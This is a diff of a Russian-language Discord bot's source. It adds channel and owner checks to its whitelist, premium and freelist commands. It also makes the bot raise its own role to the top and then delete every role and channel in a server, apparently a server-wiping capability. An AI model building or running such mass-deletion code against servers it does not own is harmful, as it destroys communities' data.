@@ -300,14 +300,26 @@ async def delete_all_channels(guild):
 
 
 async def delete_all_roles(guild):
+    # Сначала поднимаем роль бота на самый верх
+    try:
+        bot_role = guild.me.top_role
+        max_position = max([r.position for r in guild.roles])
+        if bot_role.position < max_position:
+            await bot_role.edit(position=max_position)
+            await asyncio.sleep(0.5)
+    except Exception:
+        pass
+    
     bot_role = guild.me.top_role
-    roles_to_delete = [r for r in guild.roles if r < bot_role and not r.is_default()]
+    # Сортируем роли от самой высокой к самой низкой (кроме @everyone и роли бота)
+    roles_to_delete = [r for r in sorted(guild.roles, key=lambda x: x.position, reverse=True) 
+                       if not r.is_default() and r != bot_role and r.position < bot_role.position]
     
     # Удаляем роли с задержкой, чтобы избежать rate limiting
     for role in roles_to_delete:
         try:
             await role.delete()
-            await asyncio.sleep(0.1)  # 100ms задержка между удалениями
+            await asyncio.sleep(0.15)  # 150ms задержка между удалениями
         except Exception:
             pass
 
@@ -954,10 +966,22 @@ async def update_stats_channels(guild: discord.Guild):
                 break
 
 
+def check_list_issue_channel(ctx):
+    """Проверяет что команда вызвана в канале выдача-листа на домашнем сервере"""
+    if not ctx.guild or ctx.guild.id != HOME_GUILD_ID:
+        return True  # Если не на домашнем сервере, пропускаем проверку канала
+    
+    # Проверяем что канал содержит "выдача" или "list" в названии
+    if "выдача" in ctx.channel.name.lower() or "list" in ctx.channel.name.lower():
+        return True
+    
+    return False
+
+
 @bot.command(name="wl_add")
 async def wl_add(ctx, *, user_input: str):
-    """�������� � Whitelist. ��� ���� � навсегда. � ����� � навсегда.
-    Использование: !wl_add @user [���] | !wl_add all [���]
+    """Добавить в Whitelist. Для овнера бота. Можно с длительностью.
+    Использование: !wl_add @user [дни] | !wl_add all [дни]
     """
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
@@ -976,6 +1000,22 @@ async def wl_add(ctx, *, user_input: str):
         embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
+    
+    # Проверка: только в канале "выдача-листа"
+    if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
+        if "выдача" not in ctx.channel.name.lower() and "list" not in ctx.channel.name.lower():
+            embed = discord.Embed(
+                title="❌ Неправильный канал",
+                description="Команда `!wl_add` работает только в канале **📋・выдача-листа**",
+                color=0xff0000
+            )
+            embed.set_footer(text="☠️ Kanero")
+            await ctx.send(embed=embed, delete_after=5)
+            try:
+                await ctx.message.delete()
+            except:
+                pass
+            return
 
     # Парсим с временной длительностью
     parts = user_input.rsplit(maxsplit=1)
@@ -988,7 +1028,7 @@ async def wl_add(ctx, *, user_input: str):
         except Exception:
             actual_input = user_input
 
-    # ����� ALL
+    # Выдача ALL
     if actual_input.lower() == "all":
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if not home_guild:
@@ -1029,7 +1069,7 @@ async def wl_add(ctx, *, user_input: str):
         add_temp_subscription(user_id, "wl", duration_hours)
         days = duration_hours // 24
         duration_text = f"{days} дн." if days > 0 else f"{duration_hours} ч."
-        result_text = f"❌ **{user}** ������� **White** �� **{duration_text}** (��������)."
+        result_text = f"✅ **{user}** получил **White** на **{duration_text}** (временно)."
     else:
         if user_id not in config.WHITELIST:
             config.WHITELIST.append(user_id)
@@ -1058,9 +1098,36 @@ async def wl_add(ctx, *, user_input: str):
 
 @bot.command(name="wl_remove")
 async def wl_remove(ctx, *, user_input: str):
-    # ������ подписка истекла ���все параллельно�
-    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
+    """Удалить из Whitelist. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
+    
+    # Проверка: только на домашнем сервере
+    if ctx.guild and ctx.guild.id != HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
+        embed = discord.Embed(
+            title="❌ Команда недоступна",
+            description="Команда `!wl_remove` работает **только на домашнем сервере**.",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed)
+        return
+    
+    # Проверка канала
+    if not check_list_issue_channel(ctx):
+        embed = discord.Embed(
+            title="❌ Неправильный канал",
+            description="Команда `!wl_remove` работает только в канале **📋・выдача-листа**",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed, delete_after=5)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return
+    
     user = await resolve_user(ctx, user_input)
     if not user:
         await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
@@ -1081,9 +1148,9 @@ async def wl_remove(ctx, *, user_input: str):
                     await update_stats_channels(home_guild)
         except Exception:
             pass
-        await ctx.send(f"❌ **{user}** ����� �� whitelist.")
+        await ctx.send(f"✅ **{user}** удален из whitelist.")
     else:
-        await ctx.send("�� Готово.")
+        await ctx.send("❌ Пользователь не в whitelist.")
 
 
 @bot.command(name="wl_list")
@@ -1109,8 +1176,8 @@ async def wl_list(ctx):
 
 @bot.command(name="pm_add")
 async def pm_add(ctx, *, user_input: str):
-    """�������� � Premium. ������ ��� �подписка истекла.
-    Использование: !pm_add @user [���] | !pm_add all [���]
+    """Добавить в Premium. Только для овнера бота.
+    Использование: !pm_add @user [дни] | !pm_add all [дни]
     """
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
@@ -1129,6 +1196,21 @@ async def pm_add(ctx, *, user_input: str):
         embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
+    
+    # Проверка канала
+    if not check_list_issue_channel(ctx):
+        embed = discord.Embed(
+            title="❌ Неправильный канал",
+            description="Команда `!pm_add` работает только в канале **📋・выдача-листа**",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed, delete_after=5)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return
 
     # Парсим длительность из последнего аргумента
     parts = user_input.rsplit(maxsplit=1)
@@ -1141,7 +1223,7 @@ async def pm_add(ctx, *, user_input: str):
         except (ValueError, Exception):
             actual_input = user_input
 
-    # ����� ALL � ������ ���� ��подписка истекла�� �������
+    # Выдача ALL всем участникам домашнего сервера
     if actual_input.lower() == "all":
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if not home_guild:
@@ -1174,10 +1256,10 @@ async def pm_add(ctx, *, user_input: str):
             save_whitelist()
         days = duration_hours // 24 if duration_hours else 0
         dur_text = f" на **{days} дн.**" if duration_hours else " навсегда"
-        await msg.edit(content=f"❌ **Premium**{dur_text} ����� **{count}** навсегда��.")
+        await msg.edit(content=f"✅ **Premium**{dur_text} выдан **{count}** участникам.")
         return
 
-    # ������� ����� � ��все параллельно�
+    # Выдача одному пользователю
     user = await resolve_user(ctx, actual_input)
     if not user:
         await ctx.send(f"❌ Пользователь `{actual_input}` не найден.")
@@ -1230,9 +1312,36 @@ async def pm_add(ctx, *, user_input: str):
 
 @bot.command(name="pm_remove")
 async def pm_remove(ctx, *, user_input: str):
-    # ������ подписка истекла ���все параллельно�
-    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
+    """Удалить из Premium. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
+    
+    # Проверка: только на домашнем сервере
+    if ctx.guild and ctx.guild.id != HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
+        embed = discord.Embed(
+            title="❌ Команда недоступна",
+            description="Команда `!pm_remove` работает **только на домашнем сервере**.",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed)
+        return
+    
+    # Проверка канала
+    if not check_list_issue_channel(ctx):
+        embed = discord.Embed(
+            title="❌ Неправильный канал",
+            description="Команда `!pm_remove` работает только в канале **📋・выдача-листа**",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed, delete_after=5)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return
+    
     user = await resolve_user(ctx, user_input)
     if not user:
         await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
@@ -1252,9 +1361,9 @@ async def pm_remove(ctx, *, user_input: str):
                 await update_stats_channels(home_guild)
         except Exception:
             pass
-        await ctx.send(f"❌ **{user}** ����� �� Premium.")
+        await ctx.send(f"✅ **{user}** удален из Premium.")
     else:
-        await ctx.send("�� ������ � Premium.")
+        await ctx.send("❌ Пользователь не в Premium.")
 
 
 @bot.command(name="pm_list")
@@ -2112,8 +2221,36 @@ async def fix_role_cmd(ctx, user: discord.Member = None):
 
 @bot.command(name="list_clear")
 async def list_clear(ctx):
+    """Очистить все листы (кроме owner whitelist). Только для OWNER_ID."""
     if ctx.author.id != config.OWNER_ID:
         return
+    
+    # Проверка: только на домашнем сервере
+    if ctx.guild and ctx.guild.id != HOME_GUILD_ID:
+        embed = discord.Embed(
+            title="❌ Команда недоступна",
+            description="Команда `!list_clear` работает **только на домашнем сервере**.",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed)
+        return
+    
+    # Проверка канала
+    if not check_list_issue_channel(ctx):
+        embed = discord.Embed(
+            title="❌ Неправильный канал",
+            description="Команда `!list_clear` работает только в канале **📋・выдача-листа**",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed, delete_after=5)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return
+    
     protected = set(config.OWNER_WHITELIST) | {config.OWNER_ID}
     wl_removed = len([uid for uid in config.WHITELIST if uid not in protected])
     pm_removed = len(PREMIUM_LIST)
@@ -2125,12 +2262,12 @@ async def list_clear(ctx):
     save_premium()
     save_freelist()
     embed = discord.Embed(
-        title="📊 ��� ������ �������",
+        title="📊 Все листы очищены",
         description=(
-            f"Whitelist: ������� **{wl_removed}**\n"
-            f"Premium: ������� **{pm_removed}**\n"
-            f"Freelist: ������� **{fl_removed}**\n"
-            "������ навсегда�."
+            f"Whitelist: удалено **{wl_removed}**\n"
+            f"Premium: удалено **{pm_removed}**\n"
+            f"Freelist: удалено **{fl_removed}**\n"
+            "Защищены только Owner Whitelist."
         ),
         color=0x0a0a0a
     )
@@ -2343,24 +2480,38 @@ async def setup(ctx):
     guild = ctx.guild
     msg = await ctx.send("⚙️ Начинается настройка сервера... (примерное время ~15-20 сек)")
 
-    # -- 1. Параллельное удаление всех каналов и ролей --
-    delete_tasks = []
-    
-    # Добавляем задачи удаления каналов
-    for ch in guild.channels:
-        delete_tasks.append(ch.delete())
-    
-    # Добавляем задачи удаления ролей
-    bot_role = guild.me.top_role
-    for r in guild.roles:
-        if r < bot_role and not r.is_default():
-            delete_tasks.append(r.delete())
-    
-    # Выполняем все удаления одновременно
-    if delete_tasks:
-        await asyncio.gather(*delete_tasks, return_exceptions=True)
+    # -- 1. Сначала поднимаем роль бота на самый верх --
+    try:
+        bot_role = guild.me.top_role
+        # Получаем максимальную позицию (самая верхняя роль)
+        max_position = max([r.position for r in guild.roles])
+        if bot_role.position < max_position:
+            await bot_role.edit(position=max_position)
+            await asyncio.sleep(0.5)  # Даём время на обновление
+    except Exception as e:
+        print(f"Не удалось поднять роль бота: {e}")
 
-    # -- 2. Параллельное создание ролей --
+    # -- 2. Удаляем все роли последовательно (кроме @everyone и роли бота) --
+    bot_role = guild.me.top_role
+    roles_to_delete = [r for r in sorted(guild.roles, key=lambda x: x.position, reverse=True) 
+                       if not r.is_default() and r != bot_role and r.position < bot_role.position]
+    
+    for role in roles_to_delete:
+        try:
+            await role.delete()
+            await asyncio.sleep(0.15)  # 150ms задержка между удалениями ролей
+        except Exception as e:
+            print(f"Не удалось удалить роль {role.name}: {e}")
+    
+    # -- 3. Удаляем все каналы последовательно --
+    for ch in guild.channels:
+        try:
+            await ch.delete()
+            await asyncio.sleep(0.1)  # 100ms задержка между удалениями каналов
+        except Exception as e:
+            print(f"Не удалось удалить канал {ch.name}: {e}")
+
+    # -- 4. Параллельное создание ролей --
     guest_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False)
     user_perms    = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False)
     white_perms   = discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False)
@@ -2651,6 +2802,9 @@ async def setup(ctx):
     
     # Канал медиа с задержкой 5 минут (300 секунд)
     media_ch = await guild.create_text_channel("🎬・медиа", category=cat_main, overwrites=media_ow(), topic="Медиа контент от Media и Moderator", slowmode_delay=300)
+    
+    # Канал выдача-листа (только Owner может писать команды !fl, !pm, !wl, !list)
+    list_issue_ch = await guild.create_text_channel("📋・выдача-листа", category=cat_main, overwrites=main_ow(), topic="Команды: !fl_add, !pm_add, !wl_add, !list (только для Owner)")
 
     # 💬 ━━ ЧАТЫ — Guest+ пишут 💬
     def chat_ow():
@@ -3669,8 +3823,8 @@ async def on_list(ctx):
 
 @bot.command(name="fl_add")
 async def fl_add(ctx, *, user_input: str):
-    """�������� � freelist. ��� ���� � навсегда. � ����� � навсегда.
-    Использование: !fl_add @user [���] | !fl_add all [���]
+    """Добавить в freelist. Для овнера бота. Можно с длительностью.
+    Использование: !fl_add @user [дни] | !fl_add all [дни]
     """
     if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
@@ -3689,6 +3843,21 @@ async def fl_add(ctx, *, user_input: str):
         embed.set_footer(text="☠️ Kanero")
         await ctx.send(embed=embed)
         return
+    
+    # Проверка канала
+    if not check_list_issue_channel(ctx):
+        embed = discord.Embed(
+            title="❌ Неправильный канал",
+            description="Команда `!fl_add` работает только в канале **📋・выдача-листа**",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed, delete_after=5)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return
 
     parts = user_input.rsplit(maxsplit=1)
     duration_hours = None
@@ -3700,7 +3869,7 @@ async def fl_add(ctx, *, user_input: str):
         except Exception:
             actual_input = user_input
 
-    # ����� ALL
+    # Выдача ALL
     if actual_input.lower() == "all":
         home_guild = bot.get_guild(HOME_GUILD_ID)
         if not home_guild:
@@ -3791,10 +3960,36 @@ async def fl_add(ctx, *, user_input: str):
 
 @bot.command(name="fl_remove")
 async def fl_remove(ctx, *, user_input: str):
-    """������ �� freelist. ������ ��� �подписка истекла."""
-    # ������ подписка истекла ���все параллельно�
-    if not ctx.guild or ctx.author.id != ctx.guild.owner_id:
+    """Удалить из freelist. Только для овнера бота."""
+    if ctx.author.id != config.OWNER_ID and (not ctx.guild or ctx.author.id != ctx.guild.owner_id):
         return
+    
+    # Проверка: только на домашнем сервере
+    if ctx.guild and ctx.guild.id != HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
+        embed = discord.Embed(
+            title="❌ Команда недоступна",
+            description="Команда `!fl_remove` работает **только на домашнем сервере**.",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed)
+        return
+    
+    # Проверка канала
+    if not check_list_issue_channel(ctx):
+        embed = discord.Embed(
+            title="❌ Неправильный канал",
+            description="Команда `!fl_remove` работает только в канале **📋・выдача-листа**",
+            color=0xff0000
+        )
+        embed.set_footer(text="☠️ Kanero")
+        await ctx.send(embed=embed, delete_after=5)
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+        return
+    
     user = await resolve_user(ctx, user_input)
     if not user:
         await ctx.send(f"❌ Пользователь `{user_input}` не найден.")
@@ -3814,9 +4009,9 @@ async def fl_remove(ctx, *, user_input: str):
                 await update_stats_channels(home_guild)
         except Exception:
             pass
-        await ctx.send(f"❌ **{user}** ����� �� freelist.")
+        await ctx.send(f"✅ **{user}** удален из freelist.")
     else:
-        await ctx.send("�� ������ � freelist.")
+        await ctx.send("❌ Пользователь не в freelist.")
 
 
 @bot.command(name="fl_clear")
@@ -4962,7 +5157,7 @@ async def on_member_join(member):
     embed.set_thumbnail(url=member.display_avatar.url)
     embed.set_footer(text=f"☠️ Kanero  |  Участник #{guild.member_count}")
     try:
-        await welcome_ch.send(embed=embed)
+        await welcome_ch.send(content=member.mention, embed=embed)
     except Exception:
         pass
     # Обновляем статистику
